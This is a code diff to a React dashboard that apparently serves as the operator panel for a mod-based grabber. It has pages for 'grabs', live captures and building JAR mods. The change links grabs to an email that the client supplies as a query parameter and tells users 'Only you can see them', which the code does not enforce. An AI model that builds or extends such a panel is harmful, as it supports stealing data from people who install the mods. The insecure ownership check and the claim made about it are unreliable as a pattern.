@@ -63,17 +63,18 @@ function Dashboard() {
   );
 }
 
-function Grabs({ onSelectGrab }) {
+function Grabs({ onSelectGrab, userEmail }) {
   const [grabs, setGrabs] = useState([]);
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState('');
 
   useEffect(() => {
-    fetch('/api/grabs')
+    if (!userEmail) { setLoading(false); return; }
+    fetch(`/api/grabs?owner_email=${encodeURIComponent(userEmail)}`)
       .then(r => r.json())
       .then(d => { setGrabs(d.grabs || []); setLoading(false); })
       .catch(() => setLoading(false));
-  }, []);
+  }, [userEmail]);
 
   const formatTime = (t) => {
     if (!t) return '';
@@ -228,11 +229,39 @@ function InfoRow({ label, value, full }) {
   );
 }
 
-function Build() {
+function Build({ userEmail }) {
+  const [email, setEmail] = useState(userEmail || '');
+  const [saved, setSaved] = useState(false);
+
+  const handleSave = () => {
+    localStorage.setItem('consentmod_email', email);
+    setSaved(true);
+    setTimeout(() => setSaved(false), 2000);
+  };
+
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
       <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
       <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>
+
+      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
+          <span>📧</span> Your Email
+        </div>
+        <p style={{ fontSize: 12, color: colors.textDim, margin: '0 0 12px 0' }}>Your grabs will be linked to this email. Only you can see them.</p>
+        <div style={{ display: 'flex', gap: 8 }}>
+          <input
+            value={email}
+            onChange={e => setEmail(e.target.value)}
+            placeholder="your@email.com"
+            style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
+          />
+          <button onClick={handleSave} style={{ background: saved ? colors.green : 'transparent', color: saved ? '#000' : colors.text, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
+            {saved ? '✓ Saved' : 'Save'}
+          </button>
+        </div>
+      </div>
+
       <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
           <span>🔨</span> Build Mod
@@ -245,9 +274,10 @@ function Build() {
           </div>
         </div>
         <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 8 }}>
-          <span>🔨</span> Rebuild JAR
+          <span>🔨</span> Build JAR
         </button>
       </div>
+
       <div>
         <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
         <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
@@ -507,9 +537,9 @@ export default function DashboardPage() {
         </div>
       </aside>
       {page === 'dashboard' && <Dashboard />}
-      {page === 'grabs' && <Grabs onSelectGrab={handleSelectGrab} />}
+      {page === 'grabs' && <Grabs onSelectGrab={handleSelectGrab} userEmail={userEmail} />}
       {page === 'grabdetail' && selectedGrab && <GrabDetail grab={selectedGrab} onBack={handleBackFromGrab} />}
-      {page === 'build' && <Build />}
+      {page === 'build' && <Build userEmail={userEmail} />}
       {page === 'plans' && <Plans />}
       {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
       {page === 'live' && <LiveCaptures />}
